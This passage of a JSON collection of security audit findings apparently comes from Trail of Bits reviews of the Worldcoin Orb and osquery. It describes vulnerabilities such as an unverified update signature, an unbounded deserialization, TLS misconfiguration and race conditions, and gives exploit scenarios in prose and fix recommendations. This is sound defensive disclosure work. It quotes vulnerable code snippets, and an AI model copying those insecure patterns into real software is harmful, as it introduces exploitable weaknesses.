nding TOB-ORB-5 . We conrmed this by constructing a fuzzing harness that uses the same conguration as the Orb. This means that the rst two bugs we found would not be triggerable if the Orb were congured to scan only QR codes. However, the QR code scanners memory leak issue could still aect the Orb device. Exploit Scenario An attacker shows the Orb a malicious barcode that uses a memory corruption vulnerability to give the attacker the ability to execute arbitrary code on the device. After taking control of the program, the attacker is able to exploit the Orb. Recommendations Short term, take the following actions:   Disable scanning of barcode types other than QR codes, as recommended for xing nding TOB-ORB-5 . Work with the ZBar library maintainers to x the issues described in this nding and to release a xed version of the ZBar library. Long term, extract out the functionality of QR code scanning to an external process and sandbox it so that it will have limited access if a vulnerability within it were exploited. This could be achieved with the help of the sandboxed-api tool .",
        "labels": [
            "Trail of Bits",
            "Severity: High",
            "Difficulty: High"
        ]
    },
    {
        "title": "5. The Orb QR code scanner is congured to detect all code types Fix Status: Resolved ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-08-worldcoin-orb-securityreview.pdf",
        "body": "The Orb uses the ZBar library to scan user-provided QR codes. However, the ZBar library can scan dierent types of barcodes other than QR codes, and the Orb does not recongure the library to scan only QR codes. As a result, it may scan a barcode format that was not intended to be used with the Worldcoin Orb system. This increases the attack surface of the system and may lead to other issues, especially since the ZBar library has memory safety issues, as detailed in nding TOB-ORB-4 . Exploit Scenario An attacker nds a way to exploit a memory safety issue in the ZBar library by scanning a nonQR code image. They use this vulnerability to exploit the Orb device. Recommendations Short term, disallow detection of all code types except QR codes in the ZBar library. Use the zbar_image_scanner_set_config function to explicitly enable QR codes and disable other barcode types. Example code to do so is shown in gure 5.1 (though there may be a better method). Also, note that while some code types are not enabled by default in the ZBar library, it is still worth explicitly disabling them so that an update of the library cannot enable them. // Allow QR codes zbar_image_scanner_set_config(scanner, ZBAR_QRCODE, ZBAR_CFG_ENABLE, 1 ); // Disable all other types zbar_image_scanner_set_config(scanner, ZBAR_EAN2, ZBAR_CFG_ENABLE, 0 ); zbar_image_scanner_set_config(scanner, ZBAR_EAN5, ZBAR_CFG_ENABLE, 0 ); zbar_image_scanner_set_config(scanner, ZBAR_EAN8, ZBAR_CFG_ENABLE, 0 ); zbar_image_scanner_set_config(scanner, ZBAR_UPCE, ZBAR_CFG_ENABLE, 0 ); zbar_image_scanner_set_config(scanner, ZBAR_ISBN10, ZBAR_CFG_ENABLE, 0 ); zbar_image_scanner_set_config(scanner, ZBAR_UPCA, ZBAR_CFG_ENABLE, 0 ); zbar_image_scanner_set_config(scanner, ZBAR_EAN13, ZBAR_CFG_ENABLE, 0 ); zbar_image_scanner_set_config(scanner, ZBAR_ISBN13, ZBAR_CFG_ENABLE, 0 ); zbar_image_scanner_set_config(scanner, ZBAR_COMPOSITE, ZBAR_CFG_ENABLE, 0 ); zbar_image_scanner_set_config(scanner, ZBAR_I25, ZBAR_CFG_ENABLE, 0 ); zbar_image_scanner_set_config(scanner, ZBAR_DATABAR, ZBAR_CFG_ENABLE, 0 ); zbar_image_scanner_set_config(scanner, ZBAR_DATABAR_EXP, ZBAR_CFG_ENABLE, 0 ); zbar_image_scanner_set_config(scanner, ZBAR_CODABAR, ZBAR_CFG_ENABLE, 0 ); zbar_image_scanner_set_config(scanner, ZBAR_CODE39, ZBAR_CFG_ENABLE, 0 ); zbar_image_scanner_set_config(scanner, ZBAR_PDF417, ZBAR_CFG_ENABLE, 0 ); zbar_image_scanner_set_config(scanner, ZBAR_DATABAR, ZBAR_CFG_ENABLE, 0 ); zbar_image_scanner_set_config(scanner, ZBAR_DATABAR_EXP, ZBAR_CFG_ENABLE, 0 ); zbar_image_scanner_set_config(scanner, ZBAR_SQCODE, ZBAR_CFG_ENABLE, 0 ); zbar_image_scanner_set_config(scanner, ZBAR_CODE93, ZBAR_CFG_ENABLE, 0 ); zbar_image_scanner_set_config(scanner, ZBAR_CODE128, ZBAR_CFG_ENABLE, 0 ); Figure 5.1: Example ZBar code to enable scanning of QR codes and to disable other barcode types Long term, add a functional, integration, or device test to ensure that the Orb device does not scan barcode types other than QR codes, such as with the example images from the ZBar repository and malicious barcodes from MalQR . Also, the ZBar library should be inspected every time it is updated to ensure that the available barcode types have not changed; this will prevent new and unexpected barcode types from being accepted by the Orb. Document this process internally to ensure it is done.",
        "labels": [
            "Trail of Bits",
            "Severity: Medium",
            "Difficulty: High"
        ]
    },
    {
        "title": "6. Core dumps are not disabled Fix Status: Resolved ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-08-worldcoin-orb-securityreview.pdf",
        "body": "The Orb device does not have core dumps disabled in its kernel runtime parameters (gure 6.1). If the generation of a core dump of one of the Worldcoin Orb processes is triggered, PII data could be persisted to the device disk. root@localhost:~# sysctl -a | grep core_ kernel.core_pattern = core kernel.core_pipe_limit = 0 kernel.core_uses_pid = 0 Figure 6.1: The production device core dump conguration The severity of this nding is rated as informational because it is unlikely that a core dump can be generated with the current device conguration. For a core dump to be generated, the target process would have to run in a writable path, but the overlay path ( / ) is mounted as read-only on the production device (though some paths like the /tmp path are still writable). The target process would also need to have a nonzero core le size resource limit set. Nonetheless, since the current working directory and a resource limit of a process could change, it is still worth it to disable the core dumps completely. Recommendations Short term, disable core dumps by setting the kernel.core_pattern=/dev/null sysctl parameter. This can be done by creating a sysctl conguration le in the /etc/sysctl.d/99-worldcoin-disable-core-dumps.conf path when provisioning the device. References  core Linux manual page  Arch Linux: Core dumps",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: High"
        ]
    },
    {
        "title": "7. World writable and readable sockets Fix Status: Unresolved ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-08-worldcoin-orb-securityreview.pdf",
        "body": "The socket les in the /tmp directory of the production device have permissions that are too broad. The camsock , nvscsock , and worldcoin_bus_socket sockets can be read and written to by any user on the system; additionally, the wpa_ctrl_1216-1 socket can be read by any user (gure 7.1). These permissions allow users or processes that should not have access to these sockets to access them; depending on the data that these sockets read/write, any user or process may be able to gain additional privileges or exploit the device. 320 Aug 16 14 :07 . 211 Jul 9 09 :53 .. 40 Mar 27 17 :54 .ICE-unix 40 Mar 27 17 :54 .Test-unix 40 Mar 27 17 :54 .X11-unix 40 Mar 27 17 :54 .XIM-unix 40 Mar 27 17 :54 .font-unix root@localhost:/home/worldcoin# ls -la --color=auto /tmp total 0 drwxrwxrwt 12 root root drwxrwxrwx 1 root root drwxrwxrwt 2 root root drwxrwxrwt 2 root root drwxrwxrwt 2 root root drwxrwxrwt 2 root root drwxrwxrwt 2 root root srwxrwxrwx 1 root root srwxrwxrwx 1 root root drwx------ 2 worldcoin worldcoin 40 Aug 11 14 :22 pulse-PKdhtXMmr18n drwx------ 3 root root systemd-private-a86ceebec50c43a3b1b3c79e36389670-haveged.service-2XXwnh drwx------ 3 root root systemd-private-a86ceebec50c43a3b1b3c79e36389670-systemd-logind.service-etQOVh drwx------ 3 root root systemd-private-a86ceebec50c43a3b1b3c79e36389670-systemd-resolved.service-EYsKKg drwx------ 3 root root systemd-private-a86ceebec50c43a3b1b3c79e36389670-systemd-timesyncd.service-veio4h srw-rw-rw- 1 worldcoin worldcoin 0 Mar 27 17 :54 worldcoin_bus_socket srwxr-xr-x 1 root root 0 Mar 27 17 :54 camsock 0 Mar 27 17 :54 nvscsock 0 Mar 27 17 :54 wpa_ctrl_1216-1 60 Aug 14 20 :57 60 Mar 27 17 :54 60 Aug 16 13 :13 60 Mar 27 17 :54 Figure 7.1: Permissions of sockets in the /tmp path that are too broad Recommendations Short term, change the permissions with which the sockets are created so they have the least required permissions in order for the Worldcoin Orb software to function properly. Do not set any of the socket les to be readable or writable by any user of the system. Long term, add tests to ensure the production device never ends up with a world readable or writable socket le or any other important le.",
        "labels": [
            "Trail of Bits",
            "Severity: Undetermined",
            "Difficulty: High"
        ]
    },
    {
        "title": "8. Opportunities to harden the static kernel conguration and runtime parameters Fix Status: Partially Resolved ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-08-worldcoin-orb-securityreview.pdf",
        "body": "The Orbs kernel conguration and runtime parameters can be improved to increase the overall security of the device and its applications and to decrease the potential attack surface. The following table shows the runtime parameters that can be hardened. These parameters can be read from the device by reading les under the /proc/sys/ path or through the sysctl utility tool. (Some parameters require root privileges to be read.) Parameter Current Value Recommendation kernel.kptr_restrict 1 Set the parameter to 2 to prevent kernel pointers from being leaked, even to privileged processes. kernel.unprivileged_ bpf_disabled 0 Set the parameter to 1 to prevent unprivileged processes from using the bpf syscall. Refer also to the notes regarding this parameter below the table. net.core.bpf_jit_ena ble 1 Set the parameter to 0 to disable the BPF JIT mechanism. The BPF JIT mechanism increases the attack surface of the kernel. net.core.bpf_jit_har den 0 bpf_jit_kallsyms 1 If the BPF JIT mechanism is still enabled, set the parameter to 2 to enable hardening for the BPF JIT compiler. If the BPF JIT mechanism is still enabled, set the parameter to 0 to disable the exporting of kernel symbols for the BPF JIT mechanism. Regarding BPF, the bpf syscall can be used by unprivileged processes as long as the kernel.unprivileged_bpf_disabled sysctl option is disabled , which is its default value. While this syscall should not allow a user or process to escalate privileges or crash the system, it had bugs in the past that did allow such actions, such as CVE-2023-0160 , CVE-2022-2785 , CVE-2022-0500 , CVE-2021-4204 , CVE-2020-8835 , and CVE-2017-16995 . (Refer also to this blog post on the CVE-2017-16995 bug.) The kernel conguration can also be improved. We scanned the conguration from the provided development device with the kconfig-hardened-check project (as the production device is already hardened and does not expose its kernel conguration). The results from this scan are provided in appendix C . Recommendations Short term, adjust the sysctl options as recommended in this nding. This will harden the device and lower its attack surface. Long term, take the following actions:   Use the kernel lockdown feature to prevent certain modications to the kernel image and certain conguration options. This feature was added in version 5.4 of the Linux kernel. Rebuild the Linux kernel and harden its conguration options according to the kconfig-hardened-check project results provided in appendix C .",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: High"
        ]
    },
    {
        "title": "9. The downloaded list of components to update is not veried Fix Status: Resolved ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-08-worldcoin-orb-securityreview.pdf",
        "body": "When the orb-update-agent service downloads an update claim that contains the list of components to be updated, it does not verify the claims signature eld (gure 9.1). As a result, if a malicious Orb server attempts to hijack an Orb device by serving it a malicious update claim, the orb-update-agent service would not detect that the claim is malicious. The severity of this nding is rated as informational because the code contains a commented-out signature verication check with a TODO comment indicating plans to enable it (gure 9.2). Additionally, the Orb uses the dm-verity Linux kernel feature to ensure the runtime integrity of the lesystems. We have not checked the ecacy of this feature, but the use of it should prevent a malicious update from being used. #[derive(Serialize, Debug)] pub struct Claim { version: String , manifest: crate ::Manifest, #[serde(rename = \"manifest-sig\" )] signature: String , sources: HashMap < String , Source>, system_components: crate ::Components, } Figure 9.1: The signature eld in the Claim structure ( orb-update-agent/update-agent-core/src/claim.rs ) fn run () -> eyre :: Result <()> { ... // TODO: Enable signature verification // let mut file = std::fs::File::open(settings.pubkey).expect(\"failed to open pubkey\"); // let mut contents: Vec<u8> = Vec::new(); // file.read_to_end(&mut contents)?; // // debug!(\"len: {:?}\", contents.len()); // let public_key = ring::signature::UnparsedPublicKey::new( // &ring::signature::RSA_PKCS1_1024_8192_SHA256_FOR_LEGACY_USE_ONLY, // contents, // ); // claim.verify(public_key)?; Figure 9.2: The commented-out signature verication check ( orb-update-agent/update-agent/src/main.rs ) Recommendation Short term, add the update claim signature verication check.",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: High"
        ]
    },
    {
        "title": "10. Security issues in the HTTP client conguration Fix Status: Partially Resolved ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-08-worldcoin-orb-securityreview.pdf",
        "body": "Both the orb-core and orb-update-agent codebases use a similar HTTP client conguration, but each has its own code to initialize an HTTP client (gures 10.1 and 10.2). We identied the following issues with that code:    The clients do not have a minimum TLS version set, which should be 1.3. The orb-update-agent service does not restrict the client to use only HTTPS requests. The clients do not have redirects disabled. As a result, a malicious server could perform a server-side request forgery (SSRF) attack on the client, making it hit some of its internal resources. Additionally, the clients are currently set to trust the Amazon and Google Trust Services root certicates. While this is better than trusting all default root certicates, it still creates the risk of system compromise by a malicious third-party. The TFH team knows about this issue and has a long-term goal to use a private CA in the future. fn initialize () -> Result <Client, Error> { let amazon_cert = AMAZON_ROOT_CA_1_CERT .get_or_try_init(|| Certificate::from_pem(AMAZON_ROOT_CA_1_PEM)) .map_err(Error::CreateAmazonRootCa1Cert)? .clone(); let google_cert = GTS_ROOT_R1_CERT .get_or_try_init(|| Certificate::from_pem(GTS_ROOT_R1_PEM)) .map_err(Error::CreateGtsRootR1Cert)? .clone(); Client::builder() .add_root_certificate(amazon_cert) .add_root_certificate(google_cert) .tls_built_in_root_certs( false ) .user_agent(APP_USER_AGENT) .timeout(Duration::from_secs( 120 )) .build() .map_err(Error::BuildClient) } Figure 10.1: orb-update-agent/update-agent/src/client.rs /// Creates a new HTTP client. /// /// # Panics /// /// If [`init_cert`] hasn't been called yet. pub fn client () -> reqwest :: Result <reqwest::Client> { reqwest::Client::builder() .user_agent(APP_USER_AGENT) .timeout(REQUEST_TIMEOUT) .connect_timeout(CONNECT_TIMEOUT) .tls_built_in_root_certs( false ) .add_root_certificate( AWS_CA_CERT.get().expect( \"the AWS root certificate is not initialized\" ).clone(), ) .add_root_certificate( GTS_CA_CERT.get().expect( \"the GTS root certificate is not initialized\" ).clone(), ) .https_only( true ) .build() } Figure 10.2: orb-core/src/backend/mod.rs Exploit Scenario 1 An attacker nds a way to make the orb-update-agent service connect to the back end via HTTP. Since the HTTP client does not enforce HTTPS, the attacker is able to perform a person-in-the-middle attack against the updater and further attack the device. Exploit Scenario 2 A sophisticated malicious actor who has access to the AWS/GTS root certicate and is in a person-in-the-middle position against the Orb device creates an HTTPS certicate for the TFH back-end domain and attacks the device by spoong the TFH back-end server with the created certicate. Recommendations Short term, take the following actions:  Set a minimum TLS version. This can be done by calling the min_tls_version method in the request client builder object. Ideally, the minimum version should be set to 1.3. However, the currently used native-tls back end does not allow 1. be set as the minimum TLS version. Because of that, we also recommend switching to a dierent back end that allows 1.3 to be set as the minimum version. Enforce the use of HTTPS-only connections in the orb-update-agent HTTP client. This can be done by calling the https_only(true) method in the request client builder object. Move the implementation of the two HTTP request clients from orb-core and orb-update-agent to a utility library. This will allow the same HTTP client conguration to be used by both codebases. Disable redirects in the clients by calling the redirect(Policy::none()) method on the request client builder object. This will prevent SSRF attacks from malicious servers against the Orb device.    Long term, take the following actions:   Create and pin a TFH root certicate. Authenticate the device on the server with client certicates. These actions will ensure that the device connects to a legitimate TFH server, reduce risks stemming from trust in certicates from third parties, and prevent fake devices from connecting to the server. References  OWASP: Pinning Cheat Sheet  sfackler/rust-native-tls#140 : An issue related to the lack of TLS 1.3 support in the native-tls back end",
        "labels": [
            "Trail of Bits",
            "Severity: Medium",
            "Difficulty: High"
        ]
    },
    {
        "title": "11. External GitHub CI/CD action versions are not pinned Fix Status: Resolved ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-08-worldcoin-orb-securityreview.pdf",
        "body": "The GitHub Actions pipelines use several third-party actions. These actions are part of the supply chain for TFHs CI/CD pipelines and can execute arbitrary code in the pipelines. A security incident in any of the third-party GitHub accounts or organizations can lead to a compromise of the CI/CD pipelines and any artifacts they produce. This issue does not impact the release builds of the Orb software since they are not built through the GitHub Actions CI/CD workows. The following actions are owned by GitHub organizations that might not be aliated directly with the API/software they are managing:  EndBug/add-and-commit@v9  actions/cache@v3  actions/checkout@v1  actions/checkout@v2  actions/checkout@v3  actions/download-artifact@v2  actions/download-artifact@v3  actions/setup-python@v2  actions/setup-python@v3  actions/setup-python@v4  actions/upload-artifact@v2  actions/upload-artifact@v3  arduino/setup-protoc@v1  aws-actions/configure-aws-credentials@v2  cachix/cachix-action@v12  cachix/install-nix-action@v22  dawidd6/action-get-tag@v1 (archived)  docker/build-push-action@v3  docker/setup-buildx-action@v2  docker/setup-qemu-action@v2  dtolnay/rust-toolchain@1.62.0  dtolnay/rust-toolchain@1.64.0  dtolnay/rust-toolchain@1.67.1  dtolnay/rust-toolchain@nightly  goto-bus-stop/setup-zig@v1  goto-bus-stop/setup-zig@v2  marocchino/sticky-pull-request-comment@v2  softprops/action-gh-release@v1  taiki-e/install-action@parse-changelog Note that we included GitHub actions from organizations like GitHub Actions and Docker even though TFH already implicitly trusts these organizations by virtue of using their software. However, if any of their repositories is hacked, that may impact TFHs CI builds. Exploit Scenario A private GitHub account with write permissions from one of the untrusted GitHub actions is taken over by social engineering (e.g., a user is using an already leaked password and is convinced to send a 2FA code to an attacker). The attacker updates the GitHub action to include code to exltrate the code and secrets in CI/CD pipelines that use that action, including the TFH CI/CD pipelines. Recommendations Short term, pin all external and third-party actions to a Git commit hash. Avoid pinning them to a Git tag, as tags can be changed after creation. We also recommend using the pin-github-action tool to manage pinned actions. GitHub Dependabot is capable of updating GitHub actions that use commit hashes. Long term, audit all pinned actions or replace them with a custom implementation.",
        "labels": [
            "Trail of Bits",
            "Severity: Medium",
            "Difficulty: Medium"
        ]
    },
    {
        "title": "12. The deserialize_message function can panic Fix Status: Unresolved ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-08-worldcoin-orb-securityreview.pdf",
        "body": "The deserialize_message function does not have a limit on the size value that is decoded from the received buer, so the process can panic if the decoded size exceeds the size of the provided buer (gure 12.1). This may lead to a program crash if the data comes from an untrusted source. The severity of this nding is rated as informational because this function is used to exchange data between Orb processes and we did not nd a way to trigger a panic from untrusted input. unsafe fn deserialize_message <T>(buf: & [ u8 ]) -> & T ::Archived where T: Archive + for <'a> Serialize<SharedSerializer<'a>>, { let size = usize ::from_ne_bytes(buf[..mem::size_of::< usize >()].try_into().unwrap()); let bytes = &buf[mem::size_of::< usize >()..mem::size_of::< usize >() + size]; unsafe { rkyv::archived_root::<T>(bytes) } } Figure 12.1: orb-core/src/port.rs Recommendations Short term, change the deserialize_message function to return an error if it fails to deserialize a buer. Long term, add tests or fuzzing for the deserialize_message function to make sure it works as expected when receiving invalid inputs and does not crash the program. A. Vulnerability Categories The following tables describe the vulnerability categories, severity levels, and diculty levels used in this document. Vulnerability Categories Category",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: High"
        ]
    },
    {
        "title": "1. Project dependencies are not monitored for vulnerabilities ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/osquery.pdf",
        "body": "The osquery project depends on a large number of dependencies to realize the functionality of the existing tables. They are included as Git submodules in the project. The build mechanism of each dependency has been rewritten to suit the specic needs of osquery (e.g., so that it has as few dynamically loaded libraries as possible), but there is no process in place to detect published vulnerabilities in the dependencies. As a result, osquery could continue to use code with known vulnerabilities in the dependency projects. Exploit Scenario An attacker, who has gained a foothold on a machine running osquery, leverages an existing vulnerability in a dependency to exploit osquery. He escalates his privileges to those of the osquery agent or carries out a denial-of-service attack to block the osquery agent from sending data. Recommendations Short term, regularly update the dependencies to their latest versions. Long term, establish a process within the osquery project to detect published vulnerabilities in its dependencies. 15 Atlassian: osquery Security Assessment",
        "labels": [
            "Trail of Bits",
            "Severity: High",
            "Difficulty: Medium"
        ]
    },
    {
        "title": "2. No separation of privileges when executing dependency code ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/osquery.pdf",
        "body": "In several places in the codebase, the osquery agent realizes the functionality of a table by invoking code in a dependency project. For example, the yara table is implemented by invoking code in libyara. However, there is no separation of privileges or sandboxing in place when the code in the dependency library is called, so the library code executes with the same privileges as the osquery agent. Considering the projects numerous dependencies, this issue increases the osquery agents attack surface and would exacerbate the eects of any vulnerabilities in the dependencies. Exploit Scenario An attacker nds a vulnerability in a dependency library that allows her to gain code execution, and she elevates her privileges to that of the osquery agent. Recommendations Short term, regularly update the dependencies to their latest versions. Long term, create a security barrier against the dependency library code to minimize the impact of vulnerabilities. 16 Atlassian: osquery Security Assessment",
        "labels": [
            "Trail of Bits",
            "Severity: High",
            "Difficulty: Medium"
        ]
    },
    {
        "title": "3. No limit on the amount of information that can be read from the Firefox add-ons table ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/osquery.pdf",
        "body": "The implementation of the Firefox add-ons table has no limit on the amount of information that it can read from JSON les while enumerating the add-ons installed on a user prole. This is because to directly read and parse the Firefox prole JSON le, the parseJSON implementation in the osquery agent uses boost::property_tree, which does not have this limit. pt::ptree tree; if (!osquery::parseJSON(path + kFirefoxExtensionsFile, tree).ok()) { TLOG << \"Could not parse JSON from: \" << path + kFirefoxExtensionsFile; return; } Figure 3.1: The osquery::parseJSON function has no limit on the amount of data it can read. Exploit Scenario An attacker crafts a large, valid JSON le and stores it on the Firefox prole path as extensions.json (e.g., in ~/Library/Application Support/Firefox/Profiles/foo/extensions.json on a macOS system). When osquery executes a query using the firefox_addons table, the parseJSON function reads and parses the complete le, causing high resource consumption. Recommendations Short term, enforce a maximum le size within the Firefox table, similar to the limits on other tables in osquery. Long term, consider removing osquery::parseJSON and implementing a single, standard way to parse JSON les across osquery. The osquery project currently uses both boost::property_tree and RapidJSON libraries to parse JSON les, resulting in the use of dierent code paths to handle untrusted content. 17 Atlassian: osquery Security Assessment",
        "labels": [
            "Trail of Bits",
            "Severity: Low",
            "Difficulty: Low"
        ]
    },
    {
        "title": "4. The SIP status on macOS may be misreported ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/osquery.pdf",
        "body": "If System Integrity Protection (SIP) is disabled on a Mac running osquery, the SIP conguration table might not report the correct value in the enabled column for the config_flag: sip row. For this misreporting to happen, extra ags need to be present in the value returned by csr_get_active_config and absent in the osquery kRootlessConfigFlags list. This is the case for the ags CSR_ALLOW_ANY_RECOVERY_OS, CSR_ALLOW_UNAPPROVED_KEXTS, CSR_ALLOW_EXECUTABLE_POLICY_OVERRIDE, and CSR_ALLOW_UNAUTHENTICATED_ROOT in xnu-7195.141.2/bsd/sys/csr.h (compare gure 4.1 and gure 4.3). /* CSR configuration flags */ #define CSR_ALLOW_UNTRUSTED_KEXTS (1 << 0) #define CSR_ALLOW_UNRESTRICTED_FS (1 << 1) #define CSR_ALLOW_TASK_FOR_PID (1 << 2) #define CSR_ALLOW_KERNEL_DEBUGGER (1 << 3) #define CSR_ALLOW_APPLE_INTERNAL (1 << 4) #define CSR_ALLOW_DESTRUCTIVE_DTRACE (1 << 5) /* name deprecated */ #define CSR_ALLOW_UNRESTRICTED_DTRACE (1 << 5) #define CSR_ALLOW_UNRESTRICTED_NVRAM (1 << 6) #define CSR_ALLOW_DEVICE_CONFIGURATION (1 << 7) #define CSR_ALLOW_ANY_RECOVERY_OS (1 << 8) #define CSR_ALLOW_UNAPPROVED_KEXTS (1 << 9) #define CSR_ALLOW_EXECUTABLE_POLICY_OVERRIDE (1 << 10) #define CSR_ALLOW_UNAUTHENTICATED_ROOT (1 << 11) Figure 4.1: The CSR ags in xnu-7159.141.2 18 Atlassian: osquery Security Assessment QueryData results; csr_config_t config = 0; csr_get_active_config(&config); csr_config_t valid_allowed_flags = 0; for (const auto& kv : kRootlessConfigFlags) { valid_allowed_flags |= kv.second; } Row r; r[\"config_flag\"] = \"sip\"; if (config == 0) { // SIP is enabled (default) r[\"enabled\"] = INTEGER(1); r[\"enabled_nvram\"] = INTEGER(1); } else if ((config | valid_allowed_flags) == valid_allowed_flags) { // mark SIP as NOT enabled (i.e. disabled) if // any of the valid_allowed_flags is set r[\"enabled\"] = INTEGER(0); r[\"enabled_nvram\"] = INTEGER(0); } results.push_back(r); Figure 4.2: How the SIP state is computed in genSIPConfig // rootless configuration flags // https://opensource.apple.com/source/xnu/xnu-3248.20.55/bsd/sys/csr.h const std::map<std::string, uint32_t> kRootlessConfigFlags = { // CSR_ALLOW_UNTRUSTED_KEXTS {\"allow_untrusted_kexts\", (1 << 0)}, // CSR_ALLOW_UNRESTRICTED_FS {\"allow_unrestricted_fs\", (1 << 1)}, // CSR_ALLOW_TASK_FOR_PID {\"allow_task_for_pid\", (1 << 2)}, // CSR_ALLOW_KERNEL_DEBUGGER {\"allow_kernel_debugger\", (1 << 3)}, // CSR_ALLOW_APPLE_INTERNAL {\"allow_apple_internal\", (1 << 4)}, // CSR_ALLOW_UNRESTRICTED_DTRACE {\"allow_unrestricted_dtrace\", (1 << 5)}, // CSR_ALLOW_UNRESTRICTED_NVRAM {\"allow_unrestricted_nvram\", (1 << 6)}, // CSR_ALLOW_DEVICE_CONFIGURATION {\"allow_device_configuration\", (1 << 7)}, }; Figure 4.3: The ags currently supported by osquery 19 Atlassian: osquery Security Assessment Exploit Scenario An attacker, who has gained a foothold with root privileges, disables SIP on a device running macOS and sets the csr_config ags to 0x3e7. When building the response for the sip_config table, osquery misreports the state of SIP. Recommendations Short term, consider reporting SIP as disabled if any ag is present or if any of the known ags are present (e.g., if (config & valid_allowed_flags) != 0). Long term, add support for reporting the raw ag values to the table specication and code so that the upstream server can make the nal determination on the state of SIP, irrespective of the ags supported by the osquery daemon. Additionally, monitor for changes and add support for new ags as they are added on the macOS kernel. 20 Atlassian: osquery Security Assessment",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: High"
        ]
    },
    {
        "title": "5. The OpenReadableFile function can hang on reading a le ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/osquery.pdf",
        "body": "The OpenReadableFile function creates an instance of the PlatformFile class, which is used for reading and writing les. The constructor of PlatformFile uses the open syscall to obtain a handle to the le. The OpenReadableFile function by default opens the le using the O_NONBLOCK ag, but if PlatformFiles isSpecialFile method returns true, it opens the le without using O_NONBLOCK. On the POSIX platform, the isSpecialFile method returns true for les in which fstat returns a size of zero. If the le to be read is a FIFO, the open syscall in the second invocation of PlatformFiles constructor blocks the osquery thread until another thread opens the FIFO le to write to it. struct OpenReadableFile : private boost::noncopyable { public: explicit OpenReadableFile(const fs::path& path, bool blocking = false) : blocking_io(blocking) { int mode = PF_OPEN_EXISTING | PF_READ; if (!blocking) { mode |= PF_NONBLOCK; } // Open the file descriptor and allow caller to perform error checking. fd = std::make_unique<PlatformFile>(path, mode); if (!blocking && fd->isSpecialFile()) { // A special file cannot be read in non-blocking mode, reopen in blocking // mode mode &= ~PF_NONBLOCK; blocking_io = true; fd = std::make_unique<PlatformFile>(path, mode); } } public: std::unique_ptr<PlatformFile> fd{nullptr}; 21 Atlassian: osquery Security Assessment bool blocking_io; }; Figure 5.1: The OpenReadableFile function can block the osquery thread. Exploit Scenario An attacker creates a special le, such as a FIFO, in a path known to be read by the osquery agent. When the osquery agent attempts to open and read the le, it blocks the osquery thread indenitely, in eect making osquery unable to report the status to the server. Recommendations Short term, ensure that the le operations in filesystem.cpp do not block the osquery thread. Long term, introduce a timeout on le operations so that a block does not stall the osquery thread. References  The Single Unix Specication, Version 2 22 Atlassian: osquery Security Assessment",
        "labels": [
            "Trail of Bits",
            "Severity: Medium",
            "Difficulty: Low"
        ]
    },
    {
        "title": "6. Methods in POSIX PlatformFile class are susceptible to race conditions ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/osquery.pdf",
        "body": "The POSIX implementation of the methods in the PlatformFile class includes several methods that return the current properties of a le. However, the properties can change during the lifetime of the le descriptor, so the return values of these methods may not reect the actual properties. For example, the isSpecialFile method, which is used to determine the strategy for reading the le, calls the size method. However, the le size can change between the time of the call and the reading operation, in which case the wrong strategy for reading the le could be used. bool PlatformFile::isSpecialFile() const { return (size() == 0); } static uid_t getFileOwner(PlatformHandle handle) { struct stat file; if (::fstat(handle, &file) < 0) { return -1; } return file.st_uid; } Status PlatformFile::isOwnerRoot() const { if (!isValid()) { return Status(-1, \"Invalid handle_\"); } uid_t owner_id = getFileOwner(handle_); if (owner_id == (uid_t)-1) { return Status(-1, \"fstat error\"); } if (owner_id == 0) { return Status::success(); } return Status(1, \"Owner is not root\"); } Status PlatformFile::isOwnerCurrentUser() const { 23 Atlassian: osquery Security Assessment if (!isValid()) { return Status(-1, \"Invalid handle_\"); } uid_t owner_id = getFileOwner(handle_); if (owner_id == (uid_t)-1) { return Status(-1, \"fstat error\"); } if (owner_id == ::getuid()) { return Status::success(); } return Status(1, \"Owner is not current user\"); } Status PlatformFile::isExecutable() const { struct stat file_stat; if (::fstat(handle_, &file_stat) < 0) { return Status(-1, \"fstat error\"); } if ((file_stat.st_mode & S_IXUSR) == S_IXUSR) { return Status::success(); } return Status(1, \"Not executable\"); } Status PlatformFile::hasSafePermissions() const { struct stat file; if (::fstat(handle_, &file) < 0) { return Status(-1, \"fstat error\"); } // We allow user write for now, since our main threat is external // modification by other users if ((file.st_mode & S_IWOTH) == 0) { return Status::success(); } return Status(1, \"Writable\"); } Figure 6.1: The methods in PlatformFile could cause race issues. Exploit Scenario A new function is added to osquery that uses hasSafePermissions to determine whether to allow a potentially unsafe operation. An attacker creates a le that passes the hasSafePermissions check, then changes the permissions and alters the le contents before the le is further processed by the osquery agent. 24 Atlassian: osquery Security Assessment Recommendations Short term, refactor the operations of the relevant PlatformFile class methods to minimize the race window. For example, the only place hasSafePermissions is currently used is in the safePermissions function, in which it is preceded by a check that the le is owned by root or the current user, which eliminates the possibility of an adversary using the race condition; therefore, refactoring may not be necessary in this method. Add comments to these methods describing possible adverse eects. Long term, refactor the interface of PlatformFile to contain the potential race issues within the class. For example, move the safePermissions function into the PlatformFile class so that hasSafePermissions is not exposed outside of the class. 25 Atlassian: osquery Security Assessment",
        "labels": [
            "Trail of Bits",
            "Severity: Low",
            "Difficulty: Medium"
        ]
    },
    {
        "title": "7. No limit on the amount of data that parsePlist can parse ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/osquery.pdf",
